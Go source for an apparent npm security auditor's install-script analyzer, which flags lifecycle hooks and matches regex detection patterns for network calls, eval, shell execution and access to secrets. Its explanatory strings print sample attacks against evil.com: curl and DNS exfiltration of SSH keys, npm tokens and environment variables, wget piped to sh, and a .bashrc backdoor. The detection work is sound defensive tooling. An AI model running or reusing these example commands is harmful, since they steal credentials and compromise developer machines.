package analyzer

import (
	"context"
	"regexp"
	"strings"

	"github.com/kluth/npm-security-auditter/internal/registry"
)

// ScriptsAnalyzer detects suspicious install scripts.
type ScriptsAnalyzer struct{}

func NewScriptsAnalyzer() *ScriptsAnalyzer { return &ScriptsAnalyzer{} }

func (s *ScriptsAnalyzer) Name() string { return "install-scripts" }

// dangerousScripts are lifecycle scripts that run automatically on install.
var dangerousScripts = []string{
	"preinstall",
	"install",
	"postinstall",
	"preuninstall",
	"postuninstall",
}

// suspiciousPatterns are regex patterns for dangerous operations in scripts.
var suspiciousPatterns = []struct {
	pattern     *regexp.Regexp
	description string
	severity    Severity
	exploit     string
}{
	{regexp.MustCompile(`(?i)curl\s|wget\s|http\.get|https\.get|fetch\(`), "Network request detected", SeverityHigh,
		"Install scripts with network access can exfiltrate data silently:\n" +
			"      curl -s http://evil.com/collect -d \"$(cat ~/.npmrc)\"\n" +
			"      wget -q -O- http://evil.com/backdoor.sh | sh\n" +
			"    This runs during `npm install` with the current user's full permissions."},
	{regexp.MustCompile(`(?i)eval\s*\(|Function\s*\(`), "Dynamic code execution (eval/Function)", SeverityCritical,
		"eval() executes arbitrary strings as code, commonly used to hide payloads:\n" +
			"      eval(Buffer.from('cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5j','base64').toString())\n" +
			"    That base64 decodes to: require(\"child_process\").execSync\n" +
			"    Attackers chain this with data exfiltration to steal tokens and keys."},
	{regexp.MustCompile(`(?i)child_process|exec\(|execSync|spawn\(`), "Process execution detected", SeverityCritical,
		"child_process gives full shell access to the attacker:\n" +
			"      require('child_process').execSync('cat ~/.ssh/id_rsa | curl -X POST http://evil.com/exfil -d @-')\n" +
			"    Real-world attack (ua-parser-js incident): the compromised postinstall\n" +
			"    ran a cryptominer and a credential stealer on every npm install."},
	{regexp.MustCompile(`(?i)process\.env`), "Environment variable access", SeverityMedium,
		"process.env exposes every environment variable to the script:\n" +
			"      const secrets = JSON.stringify(process.env)\n" +
			"      fetch('http://evil.com/env', {method:'POST', body: secrets})\n" +
			"    In CI/CD this leaks NPM_TOKEN, AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN, etc."},
	{regexp.MustCompile(`(?i)fs\.write|fs\.append|writeFile|appendFile`), "File system write operations", SeverityHigh,
		"Write access enables persistent backdoors:\n" +
			"      fs.appendFileSync(os.homedir()+'/.bashrc', '\\nalias sudo=\"curl evil.com/pw?=$(cat /dev/stdin)\"')\n" +
			"      fs.writeFileSync(os.homedir()+'/.npmrc', '//evil.com/:_authToken=stolen')\n" +
			"    Attackers modify shell configs, npm configs, or drop executables."},
	{regexp.MustCompile(`(?i)fs\.read|readFile|readdir`), "File system read operations", SeverityMedium,
		"File read access enables credential harvesting:\n" +
			"      fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8')\n" +
			"      fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8')\n" +
			"    Combined with network access, this is a complete credential theft chain."},
	{regexp.MustCompile(`(?i)Buffer\.from\(.*base64`), "Base64 decoding (potential obfuscation)", SeverityHigh,
		"Base64 hides malicious code from casual review and static analysis:\n" +
			"      Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20vc3RlYWwuc2ggfCBzaA==','base64').toString()\n" +
			"    Decodes to: curl http://evil.com/steal.sh | sh\n" +
			"    npm audit and most scanners will not flag the encoded payload."},
	{regexp.MustCompile(`(?i)\\x[0-9a-f]{2}|\\u[0-9a-f]{4}`), "Hex/unicode escape sequences (potential obfuscation)", SeverityMedium,
		"Hex escapes obscure function calls and strings from scanners:\n" +
			"      const fn = '\\x65\\x76\\x61\\x6c'; // spells 'eval'\n" +
			"      global[fn](payload)\n" +
			"    This bypasses pattern-matching detection that looks for literal 'eval'."},
	{regexp.MustCompile(`(?i)os\.homedir|os\.tmpdir|os\.platform`), "OS information gathering", SeverityMedium,
		"OS fingerprinting enables targeted, platform-specific payloads:\n" +
			"      const platform = os.platform() // 'linux', 'darwin', 'win32'\n" +
			"      exec(`curl http://evil.com/payload_${platform} -o /tmp/x && chmod +x /tmp/x && /tmp/x`)\n" +
			"    Attackers deliver different malware binaries per OS for higher success rate."},
	{regexp.MustCompile(`(?i)\.ssh|\.npmrc|\.bash_history|\.env`), "Access to sensitive files", SeverityCritical,
		"These are the crown jewels for an attacker:\n" +
			"      ~/.ssh/id_rsa        → SSH private keys (server access)\n" +
			"      ~/.npmrc              → npm auth tokens (publish access to your packages)\n" +
			"      ~/.bash_history       → reveals internal URLs, passwords passed as args\n" +
			"      .env                  → API keys, database passwords, secrets\n" +
			"    One stolen npm token can compromise your entire package supply chain."},
	{regexp.MustCompile(`(?i)dns\.lookup|net\.connect|socket`), "Network/DNS operations", SeverityHigh,
		"Low-level network access enables stealthy data exfiltration:\n" +
			"      dns.lookup(`${stolen_token}.evil.com`, () => {})\n" +
			"    DNS exfiltration encodes stolen data as subdomains in DNS queries.\n" +
			"    This bypasses most firewalls and HTTP-based monitoring completely.\n" +
			"    Raw sockets can also establish reverse shells for persistent access."},
}

func (s *ScriptsAnalyzer) Analyze(_ context.Context, _ *registry.PackageMetadata, version *registry.PackageVersion) ([]Finding, error) {
	var findings []Finding

	if version.Scripts == nil {
		return findings, nil
	}

	for _, scriptName := range dangerousScripts {
		scriptBody, exists := version.Scripts[scriptName]
		if !exists {
			continue
		}

		// Preinstall is more dangerous - runs BEFORE installation completes (Shai-Hulud V2 technique)
		// Even failed installations execute preinstall, maximizing attack surface
		severity := SeverityMedium
		exploitExample := "Lifecycle scripts run automatically during `npm install` with no user prompt.\n" +
			"    An attacker publishes a package with a postinstall script:\n" +
			"      \"postinstall\": \"node -e \\\"require('child_process').exec('curl evil.com/pwn|sh')\\\"\"\n" +
			"    Every developer who installs the package executes attacker-controlled code.\n" +
			"    Mitigate with: npm install --ignore-scripts"

		if scriptName == "preinstall" {
			severity = SeverityHigh
			exploitExample = "PREINSTALL is the most dangerous lifecycle hook (Shai-Hulud V2 attack vector):\n" +
				"    1. preinstall runs BEFORE the package is fully installed\n" +
				"    2. Even if installation FAILS, preinstall has already executed\n" +
				"    3. This means `npm install some-package && npm uninstall` still runs the payload\n" +
				"    4. Shai-Hulud V2 exploited this to maximize infections\n" +
				"    Mitigate with: npm install --ignore-scripts"
		}

		findings = append(findings, Finding{
			Analyzer:       s.Name(),
			Title:          "Lifecycle script: " + scriptName,
			Description:    "Package has a " + scriptName + " script: " + truncate(scriptBody, 100),
			Severity:       severity,
			ExploitExample: exploitExample,
			Remediation:    "Inspect the script content in the tarball. If the script is unnecessary, use 'npm install --ignore-scripts'. If valid, ensure it does not download or execute arbitrary external code.",
		})

		for _, sp := range suspiciousPatterns {
			if sp.pattern.MatchString(scriptBody) {
				findings = append(findings, Finding{
					Analyzer:       s.Name(),
					Title:          sp.description + " in " + scriptName,
					Description:    "Script '" + scriptName + "' contains: " + truncate(scriptBody, 100),
					Severity:       sp.severity,
					ExploitExample: sp.exploit,
					Remediation:    "This pattern suggests malicious behavior or obfuscation. Verify the script's purpose manually. If suspicious, do not install the package and report it to the registry.",
				})
			}
		}
	}

	// Check if the package declares hasInstallScript
	if version.HasInstallScript {
		found := false
		for _, sn := range dangerousScripts {
			if _, ok := version.Scripts[sn]; ok {
				found = true
				break
			}
		}
		if !found {
			findings = append(findings, Finding{
				Analyzer:    s.Name(),
				Title:       "Hidden install script",
				Description: "Package declares hasInstallScript but no visible lifecycle scripts found",
				Severity:    SeverityHigh,
				ExploitExample: "The hasInstallScript flag is set, but scripts aren't visible in the manifest.\n" +
					"    This can mean scripts are defined in a nested package.json or binding.gyp.\n" +
					"    Attackers use this to hide malicious scripts from registry browsing:\n" +
					"      1. Main package.json has no scripts\n" +
					"      2. Bundled sub-package contains the real postinstall hook\n" +
					"      3. npm still executes it — invisible to `npm view <pkg> scripts`",
				Remediation: "Inspect the full tarball contents for 'binding.gyp' or other execution hooks. This discrepancy often indicates an attempt to hide execution logic.",
			})
		}
	}

	return findings, nil
}

func truncate(s string, maxLen int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}
	return s
}
